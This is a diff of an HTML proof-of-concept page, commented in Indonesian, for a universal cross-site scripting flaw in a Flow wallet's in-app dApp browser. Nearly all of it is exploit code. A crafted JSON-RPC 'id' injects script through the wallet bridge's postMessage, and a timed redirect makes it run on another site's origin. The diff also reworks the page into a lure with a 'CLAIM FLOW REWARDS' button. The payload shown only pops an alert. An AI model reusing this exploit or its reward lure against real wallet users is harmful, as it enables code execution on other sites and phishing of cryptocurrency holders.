@@ -2,65 +2,56 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>PoC UXSS Flow Wallet</title>
+    <title>PoC UXSS Bypass</title>
     <style>
-        body { background: #000; color: #00ef8b; text-align: center; font-family: sans-serif; padding: 50px; }
-        .btn { background: #00ef8b; color: #000; padding: 20px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; }
+        body { background: #0b0e11; color: #00ef8b; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .btn { background: #00ef8b; color: #000; padding: 20px 40px; border: none; border-radius: 12px; font-weight: bold; font-size: 1.2rem; cursor: pointer; box-shadow: 0 4px 15px rgba(0,239,139,0.3); }
+        .btn:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
-    <h1>Flow dApp Browser Test</h1>
-    <p>Gunakan tombol ini untuk memicu UXSS:</p>
+    <h1>Flow dApp Browser</h1>
+    <p>Klik tombol di bawah untuk memicu klaim hadiah:</p>
     
-    <button class="btn" onclick="triggerExploit()">CLICK TO BYPASS</button>
+    <button class="btn" onclick="triggerBypass()">CLAIM FLOW REWARDS</button>
 
     <script>
-        function triggerExploit() {
-            // 1. Situs target (korban)
-            const victimOrigin = "https://www.google.com";
+        function triggerBypass() {
+            // 1. Target situs di mana alert akan muncul (Origin Korban)
+            const victimSite = "https://www.google.com";
 
-            // 2. Payload jahat sesuai temuan bug
-            // Menutup string asli: ");
-            // Menjalankan alert: alert(origin);
-            // Mematikan sisa kode: //
-            const maliciousId = '");alert("UXSS Berhasil! \n\nOrigin: " + window.location.origin);//';
+            // 2. PAYLOAD SEMPURNA:
+            // "); -> Menutup argumen pertama fungsi receiveResponseFromFlutter
+            // alert(origin); -> Perintah yang akan dijalankan di situs korban
+            // // -> Menghapus sisa kode native agar tidak terjadi Syntax Error
+            const maliciousId = '");alert("UXSS SUCCESS!\\nExecuted on: "+origin);//';
 
-            const requestData = JSON.stringify({
+            // 3. Pesan JSON yang memicu kerentanan pada idfield
+            const payload = JSON.stringify({
                 type: 'request',
                 target: 'FuelContentScript',
                 request: {
                     jsonrpc: '2.0',
-                    id: maliciousId,
+                    id: maliciousId, // Injeksi pada idfield
                     method: 'connect',
                     params: {}
                 }
             });
 
-            // 3. Cari semua kemungkinan objek dompet yang disuntikkan ke window
-            const possibleBridges = [
-                window.FueletWallet,   // Dari laporan aslinya
-                window.flow,           // Standar Flow Wallet
-                window.fcl,            // Flow Client Library
-                window.ethereum,       // Sering digunakan dApp browser umum
-                window.lilico,         // Nama lama Flow Wallet
-                window.android         // Interface Android umum
-            ];
+            // 4. Kirim ke semua kemungkinan jembatan (bridge) dompet
+            const walletBridge = window.FueletWallet || window.flow || window.fcl || window.FlowWallet;
 
-            let success = false;
-            possibleBridges.forEach(bridge => {
-                if (bridge && typeof bridge.postMessage === 'function') {
-                    bridge.postMessage(requestData);
-                    success = true;
-                }
-            });
+            if (walletBridge) {
+                // Kirim permintaan jahat
+                walletBridge.postMessage(payload);
 
-            if (success) {
-                // 4. Navigasi cepat ke origin korban agar alert muncul di sana
+                // 5. TIMING KRUSIAL (200ms - 300ms)
+                // Kita harus berpindah halaman tepat sebelum aplikasi Native membalas
                 setTimeout(() => {
-                    window.location.href = victimOrigin;
-                }, 150);
+                    window.location.href = victimSite;
+                }, 250); 
             } else {
-                alert("Kesalahan: Objek Wallet tidak terdeteksi. Silakan periksa di konsol.");
+                alert("Gagal: Objek Wallet tidak terdeteksi. Gunakan Browser Dompet!");
             }
         }
     </script>
